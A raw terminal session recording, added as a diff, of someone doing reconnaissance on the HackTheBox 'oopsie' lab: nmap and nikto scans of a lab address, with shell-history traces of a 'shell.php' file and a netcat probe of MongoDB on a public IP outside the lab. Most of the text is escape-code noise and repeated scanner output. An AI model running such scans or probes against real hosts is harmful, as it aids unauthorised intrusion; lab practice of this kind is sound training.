@@ -1,0 +1,826 @@
+Script started on 2022-05-15 21:49:59+00:00 [TERM="xterm-256color" TTY="/dev/pts/4" COLUMNS="166" LINES="41"]
+                                                                                                                                                                      ]0;kali@kali: ~/Hacking/hackthebox/TIER2/oopsie[0m[27m[24m[J[32m┌──([1m[32m[34mkali㉿kali[0m[34m[32m)-[[1m[32m[39m~/Hacking/hackthebox/TIER2/oopsie[0m[32m]
+└─[1m[32m[34m$[0m[34m[39m [K[?1h=[?2004h[32mphp[39m [35m-S[39m localhost:84 [38;2;153;153;153m4[39m [39m [38;2;153;153;153m84[39m [39m [39m [38;2;153;153;153m:84[39m [39m [39m [39m [38;2;153;153;153mt:84[39m [39m [39m [39m [39m [38;2;153;153;153mst:84[39m [39m [39m [39m [39m [39m [38;2;153;153;153most:84[39m [39m [39m [39m [39m [39m [39m [38;2;153;153;153mhost:84[39m [39m [39m [39m [39m [39m [39m [39m [8D[38;2;153;153;153mlhost:84[39m[8D [39m [39m [39m [39m [39m [39m [39m [39m [9D[38;2;153;153;153malhost:84[39m[9D [39m [39m [39m [39m [39m [39m [39m [39m [39m [10D[38;2;153;153;153mcalhost:84[39m[10D [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [11D[38;2;153;153;153mocalhost:84[39m[11D [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [12D[38;2;153;153;153mlocalhost:84[39m[12D[39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [13D[38;2;153;153;153m localhost:84[39m[13D[35m-[39m[39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [14D[38;2;153;153;153mS localhost:84[39m[14D[39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [15D[38;2;153;153;153m-S localhost:84[39m[15D[39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [16D[38;2;153;153;153m -S localhost:84[39m[16D[1m[31mp[1m[31mh[0m[39m[39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [17D[38;2;153;153;153mp -S localhost:84[39m[17D[1m[31mp[0m[39m[0m[39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [18D[1m[31mp[0m[39m[38;2;153;153;153mhp -S localhost:84[39m[18D[0m[39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [19D[1m[31mn[0m[39m[1m[31mn[0m[39m[38;2;153;153;153mano shell.php[39m[13D[1m[31mn[1m[31mn[0m[39m[39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [12D[1m[31mn[0m[39m[0m[39m [1m[31mn[0m[39m[38;2;153;153;153mano shell.php[39m[13D[0m[39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [14D[1m[31me[0m[39m[1m[31me[0m[39m[38;2;153;153;153mcho "show dbs;" | nc -zv 194.37.1.82 27017[39m[42D[0m[32me[32mx[39m[39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [41D[38;2;153;153;153mit[39m[1m[31me[1m[31mx[1m[31mp[0m[39m[39m [38;2;153;153;153mort nmap="~/Hacking/nmap.sh"[39m[28D[1m[31mp[1m[31mo[0m[39m[1m[36me[1m[36mx[1m[36mp[1m[36mo[1m[36mr[1m[36mt[0m[39m[39m [39mn[39mm[39ma[39mp[39m=[33m"[33m~[33m/[33mH[33ma[33mc[33mk[33mi[33mn[33mg[33m/[33mn[33mm[33ma[33mp[33m.[33ms[33mh[33m"[39m[?1l>[?2004l
+                                                                                                                                                                      ]0;kali@kali: ~/Hacking/hackthebox/TIER2/oopsie
+[0m[27m[24m[J[32m┌──([1m[32m[34mkali㉿kali[0m[34m[32m)-[[1m[32m[39m~/Hacking/hackthebox/TIER2/oopsie[0m[32m]
+└─[1m[32m[34m$[0m[34m[39m [K[?1h=[?2004h[1m[31mn[0m[39m[1m[31mn[0m[39m[38;2;153;153;153mano shell.php[39m[13D[0m[32mn[32mm[39m[39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [12D[38;2;153;153;153map -v -p- --min-rate 5000 -sV -sC -n archetype -o archetype.nmap2.txt[39m[69D[1m[31mn[1m[31mm[1m[31ma[0m[39m[0m[32mn[0m[32mm[0m[32ma[32mp[39m[39m [35m-[35mv[39m[39m [35m-[35mp[35m-[39m[39m [35m-[35m-[35mm[35mi[35mn[35m-[35mr[35ma[35mt[35me[39m[39m [39m5[39m0[39m0[39m0[39m [35m-[35ms[35mV[39m[39m [35m-[35ms[35mC[39m[39m [35m-[35mn[39m[39m [39ma[39mr[39mc[39mh[39me[39mt[39my[39mp[39me[39m [35m-[35mo[39m[39m [39ma[39mr[39mc[39mh[39me[39mt[39my[39mp[39me[39m.[39mn[39mm[39ma[39mp[39m2[39m.[39mt[39mx[39mt[1C[P[23C [24D[P[23C [24D[P[23C [24D[P[23C [24D[P[23C [24D[P[23C [24D[P[23C [24D[P[23C [24D[P[23C [24Do[39m [35m-[35mo[39m archetype.nmap2.txt[23Do[39m [35m-[35mo[39m archetype.nmap2.txt[23Dp[39m [35m-[35mo[39m archetype.nmap2.txt[23Ds[39m [35m-[35mo[39m archetype.nmap2.txt[23Di[39m [35m-[35mo[39m archetype.nmap2.txt[23De[39m [35m-[35mo[39m archetype.nmap2.txt[23D[1C[1C[1C[1C[1C[1C[1C[1C[1C[1C[1C[1C[1C[P[10C [11D[P[10C [11D[P[10C [11D[P[10C [11D[P[10C [11D[P[10C [11D[P[10C [11D[P[10C [11D[P[10C [11Do.nmap2.txt[10Do.nmap2.txt[10Dp.nmap2.txt[10Ds.nmap2.txt[10Di.nmap2.txt[10De.nmap2.txt[10D[1C[1C[1C[1C[1C[1C.txt [?1l>[?2004l
+Warning: The -o option is deprecated. Please use -oN
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-15 21:50 UTC
+NSE: Loaded 155 scripts for scanning.
+NSE: Script Pre-scanning.
+Initiating NSE at 21:50
+Completed NSE at 21:50, 0.00s elapsed
+Initiating NSE at 21:50
+Completed NSE at 21:50, 0.00s elapsed
+Initiating NSE at 21:50
+Completed NSE at 21:50, 0.00s elapsed
+Initiating Ping Scan at 21:50
+Scanning oopsie (10.129.172.19) [2 ports]
+Completed Ping Scan at 21:50, 0.12s elapsed (1 total hosts)
+Initiating Connect Scan at 21:50
+Scanning oopsie (10.129.172.19) [65535 ports]
+Discovered open port 80/tcp on 10.129.172.19
+Discovered open port 22/tcp on 10.129.172.19
+Increasing send delay for 10.129.172.19 from 0 to 5 due to 250 out of 831 dropped probes since last increase.
+Increasing send delay for 10.129.172.19 from 5 to 10 due to max_successful_tryno increase to 4
+Increasing send delay for 10.129.172.19 from 10 to 20 due to max_successful_tryno increase to 5
+Increasing send delay for 10.129.172.19 from 20 to 40 due to 354 out of 1178 dropped probes since last increase.
+Increasing send delay for 10.129.172.19 from 40 to 80 due to max_successful_tryno increase to 6
+Increasing send delay for 10.129.172.19 from 80 to 160 due to max_successful_tryno increase to 7
+Increasing send delay for 10.129.172.19 from 160 to 320 due to max_successful_tryno increase to 8
+Increasing send delay for 10.129.172.19 from 320 to 640 due to 181 out of 603 dropped probes since last increase.
+Increasing send delay for 10.129.172.19 from 640 to 1000 due to 284 out of 946 dropped probes since last increase.
+Warning: 10.129.172.19 giving up on port because retransmission cap hit (10).
+Completed Connect Scan at 21:51, 57.32s elapsed (65535 total ports)
+Initiating Service scan at 21:51
+Scanning 2 services on oopsie (10.129.172.19)
+Completed Service scan at 21:51, 6.25s elapsed (2 services on 1 host)
+NSE: Script scanning 10.129.172.19.
+Initiating NSE at 21:51
+Completed NSE at 21:51, 4.55s elapsed
+Initiating NSE at 21:51
+Completed NSE at 21:51, 0.48s elapsed
+Initiating NSE at 21:51
+Completed NSE at 21:51, 0.00s elapsed
+Nmap scan report for oopsie (10.129.172.19)
+Host is up (0.12s latency).
+Not shown: 53576 closed tcp ports (conn-refused), 11957 filtered tcp ports (no-response)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 61:e4:3f:d4:1e:e2:b2:f1:0d:3c:ed:36:28:36:67:c7 (RSA)
+|   256 24:1d:a4:17:d4:e3:2a:9c:90:5c:30:58:8f:60:77:8d (ECDSA)
+|_  256 78:03:0e:b4:a1:af:e5:c2:f9:8d:29:05:3e:29:c9:f2 (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-title: Welcome
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+NSE: Script Post-scanning.
+Initiating NSE at 21:51
+Completed NSE at 21:51, 0.00s elapsed
+Initiating NSE at 21:51
+Completed NSE at 21:51, 0.00s elapsed
+Initiating NSE at 21:51
+Completed NSE at 21:51, 0.00s elapsed
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 70.58 seconds
+                                                                                                                                                                      ]0;kali@kali: ~/Hacking/hackthebox/TIER2/oopsie
+[0m[27m[24m[J[32m┌──([1m[32m[34mkali㉿kali[0m[34m[32m)-[[1m[32m[39m~/Hacking/hackthebox/TIER2/oopsie[0m[32m]
+└─[1m[32m[34m$[0m[34m[39m [K[?1h=[?2004h[A[0m[27m[24m[J[32m┌──([1m[32m[34mkali㉿kali[0m[34m[32m)-[[1m[32m[39m~/Hacking/hackthebox/TIER2/oopsie[0m[32m]
+└─[1m[32m[34m$[0m[34m[39m [H[2J[0m[27m[24m[J[32m┌──([1m[32m[34mkali㉿kali[0m[34m[32m)-[[1m[32m[39m~/Hacking/hackthebox/TIER2/oopsie[0m[32m]
+└─[1m[32m[34m$[0m[34m[39m [K[32mw[39m[32mw[39m[38;2;153;153;153mhois 194.37.1.82[39m[16D[1m[31mw[1m[31mh[0m[39m[1m[31mw[1m[31mh[1m[31ma[0m[39m[39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [14D[1m[31ma[1m[31mt[0m[39m[1m[31mt[1m[31mw[0m[39m[1m[31mw[1m[31me[0m[39m[0m[32mw[0m[32mh[0m[32ma[0m[32mt[0m[32mw[0m[32me[32mb[39m [7mhttp://10.129.172.19/cdn-cgi/login/index.php[27m[44D[27mh[27mt[27mt[27mp[27m:[27m/[27m/[27m1[27m0[27m.[27m1[27m2[27m9[27m.[27m1[27m7[27m2[27m.[27m1[27m9[27m/[27mc[27md[27mn[27m-[27mc[27mg[27mi[27m/[27ml[27mo[27mg[27mi[27mn[27m/[27mi[27mn[27md[27me[27mx[27m.[27mp[27mh[27mp[?1l>[?2004l
+[1m[34mhttp://10.129.172.19/cdn-cgi/login/index.php[0m [200 OK] [1mApache[0m[[1m[32m2.4.29[0m], [1mCountry[0m[[0m[22mRESERVED[0m][[1m[31mZZ[0m], [1mHTML5[0m, [1mHTTPServer[0m[[1m[31mUbuntu Linux[0m][[1m[36mApache/2.4.29 (Ubuntu)[0m], [1mIP[0m[[0m[22m10.129.172.19[0m], [1mPasswordField[0m[[0m[22mpassword[0m], [1mScript[0m, [1mTitle[0m[[1m[33mLogin[0m]
+                                                                                                                                                                       ]0;kali@kali: ~/Hacking/hackthebox/TIER2/oopsie
+[0m[27m[24m[J[32m┌──([1m[32m[34mkali㉿kali[0m[34m[32m)-[[1m[32m[39m~/Hacking/hackthebox/TIER2/oopsie[0m[32m]
+└─[1m[32m[34m$[0m[34m[39m [K[?1h=[?2004h[1m[31mn[0m[39m[1m[31mn[0m[39m[38;2;153;153;153mmap -v -p- --min-rate 5000 -sV -sC -n oopsie -o oopsie.nmap.txt[39m[63D[1m[31mn[1m[31mi[0m[39m[39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [62D[38;2;153;153;153mkto -h 192.168.1.42[39m[19D[0m[32mn[0m[32mi[32mk[32mt[32mo[39m[39m [35m-[35mh[39m[39m [39m1[39m9[39m2[39m.[39m1[39m6[39m8[39m.[39m1[39m.[39m4[39m2 [38;2;153;153;153m2[39m [39m [38;2;153;153;153m42[39m [39m [39m [38;2;153;153;153m.42[39m [39m [39m [39m [38;2;153;153;153m1.42[39m [39m [39m [39m [39m [38;2;153;153;153m.1.42[39m [39m [39m [39m [39m [39m [38;2;153;153;153m8.1.42[39m[38;2;153;153;153m8[38;2;153;153;153m.[38;2;153;153;153m1[38;2;153;153;153m.[38;2;153;153;153m4[38;2;153;153;153m2[39m[39m [38;2;153;153;153m8[38;2;153;153;153m.[38;2;153;153;153m1[38;2;153;153;153m.[38;2;153;153;153m4[38;2;153;153;153m2[39m[39m  [39m [39m [39m [39m [39m [39m [38;2;153;153;153m.168.1.42[39m[9D [39m [39m [39m [39m [39m [39m [39m [39m [39m [10D[38;2;153;153;153m2.168.1.42[39m[10D [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [11D[38;2;153;153;153m92.168.1.42[39m[11D [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [12D[38;2;153;153;153m192.168.1.42[39m[12D[39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [13D[38;2;153;153;153m 192.168.1.42[39m[13D[35m-[39m[39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [14D[38;2;153;153;153mh 192.168.1.42[39m[14D[39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [15D[38;2;153;153;153m-h 192.168.1.42[39m[15D[39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [16D[38;2;153;153;153m -h 192.168.1.42[39m[16D[39m [35m-[35mh[39m[39m [39m1[39m9[39m2[39m.[39m1[39m6[39m8[39m.[39m1[39m.[39m4[39m2 [38;2;153;153;153m2[39m [39m [38;2;153;153;153m42[39m [39m [39m [38;2;153;153;153m.42[39m [39m [39m [39m [38;2;153;153;153m1.42[39m [39m [39m [39m [39m [38;2;153;153;153m.1.42[39m [39m [39m [39m [39m [39m [38;2;153;153;153m8.1.42[39m [39m [39m [39m [39m [39m [39m [38;2;153;153;153m68.1.42[39m [39m [39m [39m [39m [39m [39m [39m [8D[38;2;153;153;153m168.1.42[39m[8D [39m [39m [39m [39m [39m [39m [39m [39m [9D[38;2;153;153;153m.168.1.42[39m[9D [39m [39m [39m [39m [39m [39m [39m [39m [39m [10D[38;2;153;153;153m2.168.1.42[39m[10D [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [11D[38;2;153;153;153m92.168.1.42[39m[11D [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [12D[38;2;153;153;153m192.168.1.42[39m[12D[39m[7mh[39m[7mt[39m[7mt[39m[7mp[39m[7m:[39m[7m/[39m[7m/[39m[7m1[39m[7m0[39m[7m.[39m[7m1[39m[7m2[7m9.172.19/cdn-cgi/login/index.php[27m[44D[27mh[27mt[27mt[27mp[27m:[27m/[27m/[27m1[27m0[27m.[27m1[27m2[27m9[27m.[27m1[27m7[27m2[27m.[27m1[27m9[27m/[27mc[27md[27mn[27m-[27mc[27mg[27mi[27m/[27ml[27mo[27mg[27mi[27mn[27m/[27mi[27mn[27md[27me[27mx[27m.[27mp[27mh[27mp[?1l>[?2004l
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          10.129.172.19
++ Target Hostname:    10.129.172.19
++ Target Port:        80
++ Start Time:         2022-05-15 22:16:17 (GMT0)
+---------------------------------------------------------------------------
++ Server: Apache/2.4.29 (Ubuntu)
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ Apache/2.4.29 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
++ /10.129.172.19.egg: Potentially interesting archive/cert file found.
++ /10.129.172.19.egg: Potentially interesting archive/cert file found. (NOTE: requested by IP address).
++ /10.129.pem: Potentially interesting archive/cert file found.
++ /10.129.pem: Potentially interesting archive/cert file found. (NOTE: requested by IP address).
++ /19.egg: Potentially interesting archive/cert file found.
++ /19.egg: Potentially interesting archive/cert file found. (NOTE: requested by IP address).
++ /10129.jks: Potentially interesting archive/cert file found.
++ /10129.jks: Potentially interesting archive/cert file found. (NOTE: requested by IP address).
++ /19.pem: Potentially interesting archive/cert file found.
++ /19.pem: Potentially interesting archive/cert file found. (NOTE: requested by IP address).
++ /10129.tar.lzma: Potentially interesting archive/cert file found.
++ /10129.tar.lzma: Potentially interesting archive/cert file found. (NOTE: requested by IP address).
++ /10.129.172.jks: Potentially interesting archive/cert file found.
++ /10.129.172.jks: Potentially interesting archive/cert file found. (NOTE: requested by IP address).
++ /10129.pem: Potentially interesting archive/cert file found.
++ /10129.pem: Potentially interesting archive/cert file found. (NOTE: requested by IP address).
++ /10.129.172.tar.bz2: Potentially interesting archive/cert file found.
++ /10.129.172.tar.bz2: Potentially interesting archive/cert file found. (NOTE: requested by IP address).
++ /19.tar: Potentially interesting archive/cert file found.
++ /19.tar: Potentially interesting archive/cert file found. (NOTE: requested by IP address).
++ /10.tgz: Potentially interesting archive/cert file found.
++ /10.tgz: Potentially interesting archive/cert file found. (NOTE: requested by IP address).
++ /129.tar: Potentially interesting archive/cert file found.
++ /129.tar: Potentially interesting archive/cert file found. (NOTE: requested by IP address).
++ /172.alz: Potentially interesting archive/cert file found.
++ /172.alz: Potentially interesting archive/cert file found. (NOTE: requested by IP address).
++ /129.cer: Potentially interesting archive/cert file found.
++ /129.cer: Potentially interesting archive/cert file found. (NOTE: requested by IP address).
++ /129.tar.lzma: Potentially interesting archive/cert file found.
++ /129.tar.lzma: Potentially interesting archive/cert file found. (NOTE: requested by IP address).
++ /10_129_172_19.tar.bz2: Potentially interesting archive/cert file found.
++ /10_129_172_19.tar.bz2: Potentially interesting archive/cert file found. (NOTE: requested by IP address).
++ /10_129_172_19.jks: Potentially interesting archive/cert file found.
++ /10_129_172_19.jks: Potentially interesting archive/cert file found. (NOTE: requested by IP address).
++ /10129172.alz: Potentially interesting archive/cert file found.
++ /10129172.alz: Potentially interesting archive/cert file found. (NOTE: requested by IP address).
++ /10129172.tar: Potentially interesting archive/cert file found.
++ /10129172.tar: Potentially interesting archive/cert file found. (NOTE: requested by IP address).
++ /10129.tar.bz2: Potentially interesting archive/cert file found.
++ /10129.tar.bz2: Potentially interesting archive/cert file found. (NOTE: requested by IP address).
++ /10.129.172.19.pem: Potentially interesting archive/cert file found.
++ /10.129.172.19.pem: Potentially interesting archive/cert file found. (NOTE: requested by IP address).
++ /129.pem: Potentially interesting archive/cert file found.
++ /129.pem: Potentially interesting archive/cert file found. (NOTE: requested by IP address).
++ /10129172.tgz: Potentially interesting archive/cert file found.
++ /10129172.tgz: Potentially interesting archive/cert file found. (NOTE: requested by IP address).
++ /10129172.cer: Potentially interesting archive/cert file found.
++ /10129172.cer: Potentially interesting archive/cert file found. (NOTE: requested by IP address).
++ /site.tar: Potentially interesting archive/cert file found.
++ /site.tar: Potentially interesting archive/cert file found. (NOTE: requested by IP address).
++ /10.129.172.tar.lzma: Potentially interesting archive/cert file found.
++ /10.129.172.tar.lzma: Potentially interesting archive/cert file found. (NOTE: requested by IP address).
++ /10129.alz: Potentially interesting archive/cert file found.
++ /10129.alz: Potentially interesting archive/cert file found. (NOTE: requested by IP address).
++ /10.129.172.19.tar: Potentially interesting archive/cert file found.
++ /10.129.172.19.tar: Potentially interesting archive/cert file found. (NOTE: requested by IP address).
++ /site.cer: Potentially interesting archive/cert file found.
++ /site.cer: Potentially interesting archive/cert file found. (NOTE: requested by IP address).
++ /10.129.172.alz: Potentially interesting archive/cert file found.
++ /10.129.172.alz: Potentially interesting archive/cert file found. (NOTE: requested by IP address).
++ /19.alz: Potentially interesting archive/cert file found.
++ /19.alz: Potentially interesting archive/cert file found. (NOTE: requested by IP address).
++ /backup.pem: Potentially interesting archive/cert file found.
++ /backup.pem: Potentially interesting archive/cert file found. (NOTE: requested by IP address).
++ /10.129.172.19.cer: Potentially interesting archive/cert file found.
++ /10.129.172.19.cer: Potentially interesting archive/cert file found. (NOTE: requested by IP address).
++ /10.129.tar.bz2: Potentially interesting archive/cert file found.
++ /10.129.tar.bz2: Potentially interesting archive/cert file found. (NOTE: requested by IP address).
++ /10129172.egg: Potentially interesting archive/cert file found.
++ /10129172.egg: Potentially interesting archive/cert file found. (NOTE: requested by IP address).
++ /10.129.172.war: Potentially interesting archive/cert file found.
++ /10.129.172.war: Potentially interesting archive/cert file found. (NOTE: requested by IP address).
++ /10.129.172.19.war: Potentially interesting archive/cert file found.
++ /10.129.172.19.war: Potentially interesting archive/cert file found. (NOTE: requested by IP address).
++ /172.tgz: Potentially interesting archive/cert file found.
++ /172.tgz: Potentially interesting archive/cert file found. (NOTE: requested by IP address).
++ /129.tar.bz2: Potentially interesting archive/cert file found.
++ /129.tar.bz2: Potentially interesting archive/cert file found. (NOTE: requested by IP address).
++ /10129.war: Potentially interesting archive/cert file found.
++ /10129.war: Potentially interesting archive/cert file found. (NOTE: requested by IP address).
++ /10.129.tar.lzma: Potentially interesting archive/cert file found.
++ /10.129.tar.lzma: Potentially interesting archive/cert file found. (NOTE: requested by IP address).
++ /172.egg: Potentially interesting archive/cert file found.
++ /172.egg: Potentially interesting archive/cert file found. (NOTE: requested by IP address).
++ /10.129.jks: Potentially interesting archive/cert file found.
++ /10.129.jks: Potentially interesting archive/cert file found. (NOTE: requested by IP address).
++ /19.tar.bz2: Potentially interesting archive/cert file found.
++ /19.tar.bz2: Potentially interesting archive/cert file found. (NOTE: requested by IP address).
++ /172.war: Potentially interesting archive/cert file found.
++ /172.war: Potentially interesting archive/cert file found. (NOTE: requested by IP address).
++ /10.129.172.19.tgz: Potentially interesting archive/cert file found.
++ /10.129.172.19.tgz: Potentially interesting archive/cert file found. (NOTE: requested by IP address).
++ /10129.tgz: Potentially interesting archive/cert file found.
++ /10129.tgz: Potentially interesting archive/cert file found. (NOTE: requested by IP address).
++ /1012917219.tar: Potentially interesting archive/cert file found.
++ /1012917219.tar: Potentially interesting archive/cert file found. (NOTE: requested by IP address).
++ /10129172.pem: Potentially interesting archive/cert file found.
++ /10129172.pem: Potentially interesting archive/cert file found. (NOTE: requested by IP address).
++ /10.cer: Potentially interesting archive/cert file found.
++ /10.cer: Potentially interesting archive/cert file found. (NOTE: requested by IP address).
++ /10_129_172_19.tar.lzma: Potentially interesting archive/cert file found.
++ /10_129_172_19.tar.lzma: Potentially interesting archive/cert file found. (NOTE: requested by IP address).
++ /19.jks: Potentially interesting archive/cert file found.
++ /19.jks: Potentially interesting archive/cert file found. (NOTE: requested by IP address).
++ /1012917219.egg: Potentially interesting archive/cert file found.
++ /1012917219.egg: Potentially interesting archive/cert file found. (NOTE: requested by IP address).
++ /10.129.172.19.alz: Potentially interesting archive/cert file found.
++ /10.129.172.19.alz: Potentially interesting archive/cert file found. (NOTE: requested by IP address).
++ /19.tar.lzma: Potentially interesting archive/cert file found.
++ /19.tar.lzma: Potentially interesting archive/cert file found. (NOTE: requested by IP address).
++ /backup.tar.lzma: Potentially interesting archive/cert file found.
++ /backup.tar.lzma: Potentially interesting archive/cert file found. (NOTE: requested by IP address).
++ /backup.jks: Potentially interesting archive/cert file found.
++ /backup.jks: Potentially interesting archive/cert file found. (NOTE: requested by IP address).
++ /172.jks: Potentially interesting archive/cert file found.
++ /172.jks: Potentially interesting archive/cert file found. (NOTE: requested by IP address).
++ /10.129.172.pem: Potentially interesting archive/cert file found.
++ /10.129.172.pem: Potentially interesting archive/cert file found. (NOTE: requested by IP address).
++ /1012917219.tgz: Potentially interesting archive/cert file found.
++ /1012917219.tgz: Potentially interesting archive/cert file found. (NOTE: requested by IP address).
++ /10129.egg: Potentially interesting archive/cert file found.
++ /10129.egg: Potentially interesting archive/cert file found. (NOTE: requested by IP address).
++ /10129172.tar.lzma: Potentially interesting archive/cert file found.
++ /10129172.tar.lzma: Potentially interesting archive/cert file found. (NOTE: requested by IP address).
++ /10.129.172.cer: Potentially interesting archive/cert file found.
++ /10.129.172.cer: Potentially interesting archive/cert file found. (NOTE: requested by IP address).
++ /10.war: Potentially interesting archive/cert file found.
++ /10.war: Potentially interesting archive/cert file found. (NOTE: requested by IP address).
++ /10129.cer: Potentially interesting archive/cert file found.
++ /10129.cer: Potentially interesting archive/cert file found. (NOTE: requested by IP address).
++ /backup.tar.bz2: Potentially interesting archive/cert file found.
++ /backup.tar.bz2: Potentially interesting archive/cert file found. (NOTE: requested by IP address).
++ /site.war: Potentially interesting archive/cert file found.
++ /site.war: Potentially interesting archive/cert file found. (NOTE: requested by IP address).
++ /backup.war: Potentially interesting archive/cert file found.
++ /backup.war: Potentially interesting archive/cert file found. (NOTE: requested by IP address).
++ /1012917219.tar.lzma: Potentially interesting archive/cert file found.
++ /1012917219.tar.lzma: Potentially interesting archive/cert file found. (NOTE: requested by IP address).
++ /129.jks: Potentially interesting archive/cert file found.
++ /129.jks: Potentially interesting archive/cert file found. (NOTE: requested by IP address).
++ /10.129.cer: Potentially interesting archive/cert file found.
++ /10.129.cer: Potentially interesting archive/cert file found. (NOTE: requested by IP address).
++ /10.129.172.19.tar.bz2: Potentially interesting archive/cert file found.
++ /10.129.172.19.tar.bz2: Potentially interesting archive/cert file found. (NOTE: requested by IP address).
++ /10.129.egg: Potentially interesting archive/cert file found.
++ /10.129.egg: Potentially interesting archive/cert file found. (NOTE: requested by IP address).
++ /10129172.war: Potentially interesting archive/cert file found.
++ /10129172.war: Potentially interesting archive/cert file found. (NOTE: requested by IP address).
++ /10.129.172.19.jks: Potentially interesting archive/cert file found.
++ /10.129.172.19.jks: Potentially interesting archive/cert file found. (NOTE: requested by IP address).
++ /site.pem: Potentially interesting archive/cert file found.
++ /site.pem: Potentially interesting archive/cert file found. (NOTE: requested by IP address).
++ /10_129_172_19.egg: Potentially interesting archive/cert file found.
++ /10_129_172_19.egg: Potentially interesting archive/cert file found. (NOTE: requested by IP address).
++ /1012917219.alz: Potentially interesting archive/cert file found.
++ /1012917219.alz: Potentially interesting archive/cert file found. (NOTE: requested by IP address).
++ /10.alz: Potentially interesting archive/cert file found.
++ /10.alz: Potentially interesting archive/cert file found. (NOTE: requested by IP address).
++ /172.tar.bz2: Potentially interesting archive/cert file found.
++ /172.tar.bz2: Potentially interesting archive/cert file found. (NOTE: requested by IP address).
++ /129.tgz: Potentially interesting archive/cert file found.
++ /129.tgz: Potentially interesting archive/cert file found. (NOTE: requested by IP address).
++ /10.tar: Potentially interesting archive/cert file found.
++ /10.tar: Potentially interesting archive/cert file found. (NOTE: requested by IP address).
++ /1012917219.jks: Potentially interesting archive/cert file found.
++ /1012917219.jks: Potentially interesting archive/cert file found. (NOTE: requested by IP address).
++ /1012917219.tar.bz2: Potentially interesting archive/cert file found.
++ /1012917219.tar.bz2: Potentially interesting archive/cert file found. (NOTE: requested by IP address).
++ /10_129_172_19.tar: Potentially interesting archive/cert file found.
++ /10_129_172_19.tar: Potentially interesting archive/cert file found. (NOTE: requested by IP address).
++ /10.pem: Potentially interesting archive/cert file found.
++ /10.pem: Potentially interesting archive/cert file found. (NOTE: requested by IP address).
++ /10.egg: Potentially interesting archive/cert file found.
++ /10.egg: Potentially interesting archive/cert file found. (NOTE: requested by IP address).
++ /backup.egg: Potentially interesting archive/cert file found.
++ /backup.egg: Potentially interesting archive/cert file found. (NOTE: requested by IP address).
++ /10_129_172_19.pem: Potentially interesting archive/cert file found.
++ /10_129_172_19.pem: Potentially interesting archive/cert file found. (NOTE: requested by IP address).
++ /backup.cer: Potentially interesting archive/cert file found.
++ /backup.cer: Potentially interesting archive/cert file found. (NOTE: requested by IP address).
++ /129.war: Potentially interesting archive/cert file found.
++ /129.war: Potentially interesting archive/cert file found. (NOTE: requested by IP address).
++ /129.egg: Potentially interesting archive/cert file found.
++ /129.egg: Potentially interesting archive/cert file found. (NOTE: requested by IP address).
++ /site.tar.bz2: Potentially interesting archive/cert file found.
++ /site.tar.bz2: Potentially interesting archive/cert file found. (NOTE: requested by IP address).
++ /10.129.war: Potentially interesting archive/cert file found.
++ /10.129.war: Potentially interesting archive/cert file found. (NOTE: requested by IP address).
++ /19.tgz: Potentially interesting archive/cert file found.
++ /19.tgz: Potentially interesting archive/cert file found. (NOTE: requested by IP address).
++ /10129.tar: Potentially interesting archive/cert file found.
++ /10129.tar: Potentially interesting archive/cert file found. (NOTE: requested by IP address).
++ /site.egg: Potentially interesting archive/cert file found.
++ /site.egg: Potentially interesting archive/cert file found. (NOTE: requested by IP address).
++ /10_129_172_19.tgz: Potentially interesting archive/cert file found.
++ /10_129_172_19.tgz: Potentially interesting archive/cert file found. (NOTE: requested by IP address).
++ /10.129.tgz: Potentially interesting archive/cert file found.
